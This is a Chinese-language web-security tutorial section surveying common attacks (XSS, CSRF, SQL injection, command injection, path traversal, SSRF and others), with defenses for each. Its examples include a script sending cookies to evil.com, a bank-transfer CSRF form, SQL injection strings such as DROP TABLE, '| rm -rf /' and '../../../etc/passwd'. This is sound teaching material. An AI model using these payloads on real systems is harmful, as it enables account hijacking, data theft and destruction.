90.2 常见攻击类型

Web 攻击方式概览

🎯 学习目标

  • 了解常见 Web 攻击类型
  • 理解各类攻击的原理
  • 认识攻击的危害
  • 了解基本防护思路

📚 XSS 攻击

# 跨站脚本攻击 (Cross-Site Scripting) ## 攻击原理 攻击者将恶意脚本注入到网页中，当其他用户浏览时执行 ## 攻击类型 1. 反射型 XSS - URL 参数直接输出 2. 存储型 XSS - 恶意代码存储在服务器 3. DOM 型 XSS - 前端 JavaScript 动态渲染 ## 危害 - 窃取 Cookie 和 Session - 劫持用户账户 - 篡改网页内容 - 传播蠕虫病毒 ## 示例 # 反射型 XSS https://example.com/search?q=<script>alert('XSS')</script> # 存储型 XSS 评论内容: <script> fetch('https://evil.com/steal?cookie=' + document.cookie) </script> ## 防护 - 输出编码 (HTML Entity Encoding) - 内容安全策略 (CSP) - 输入验证和过滤 - 使用安全的模板引擎

🔧 CSRF 攻击

# 跨站请求伪造 (Cross-Site Request Forgery) ## 攻击原理 攻击者诱导用户访问恶意网站，利用用户已登录状态发起请求 ## 攻击流程 1. 用户登录正常网站 A 2. 用户访问恶意网站 B 3. 网站 B 发起对网站 A 的请求 4. 请求携带用户在 A 的凭证 ## 危害 - 修改用户信息 - 发起转账 - 发送消息 - 执行敏感操作 ## 示例 # 恶意网站代码 <img src="https://bank.com/transfer?to=hacker&amount=1000"> <form action="https://bank.com/transfer" method="POST"> <input type="hidden" name="to" value="hacker"> <input type="hidden" name="amount" value="1000"> </form> <script>document.forms[0].submit();</script> ## 防护 - CSRF Token 验证 - SameSite Cookie 属性 - Referer 检查 - 双重 Cookie 验证
⚠️
注意

CSRF 攻击利用的是用户的登录状态，而不是窃取凭证。防护的关键是确保请求来源可信。

⚙️ SQL 注入

# SQL 注入攻击 (SQL Injection) ## 攻击原理 攻击者通过输入注入 SQL 代码，操纵数据库执行非预期操作 ## 危害 - 绕过认证 - 窃取数据 - 篡改数据 - 删除数据 - 执行系统命令 ## 示例 # 登录绕过 用户名: admin' -- 密码: anything # 生成的 SQL SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything' # 数据窃取 用户名: ' UNION SELECT username, password FROM users -- # 删除数据 用户名: '; DROP TABLE users; -- ## 防护 - 参数化查询 / 预处理语句 - ORM 框架 - 输入验证 - 最小权限原则 - 错误信息脱敏

🚀 其他常见攻击

# 文件上传漏洞 - 上传恶意脚本文件 - 上传超大文件导致拒绝服务 - 路径遍历攻击 防护: 验证文件类型、重命名文件、隔离存储目录 # 命令注入 - 通过输入执行系统命令 - 示例: | rm -rf / 防护: 输入验证、避免执行用户输入、使用安全的 API # 路径遍历 - 访问预期目录外的文件 - 示例: ../../../etc/passwd 防护: 规范化路径、限制访问范围 # 点击劫持 - 透明 iframe 覆盖恶意按钮 - 诱导用户点击 防护: X-Frame-Options、CSP frame-ancestors # 敏感信息泄露 - 错误信息暴露内部细节 - 版本信息暴露 - 敏感数据未加密 防护: 错误处理、信息脱敏、加密存储 # 服务端请求伪造 (SSRF) - 服务端发起内部请求 - 访问内网资源 防护: URL 白名单、禁止内网 IP、禁用重定向

📝 本节小结

✅
  • • XSS 通过注入脚本窃取用户信息
  • • CSRF 伪造请求执行敏感操作
  • • SQL 注入操纵数据库
  • • 防护的核心原则：永远不要信任用户输入
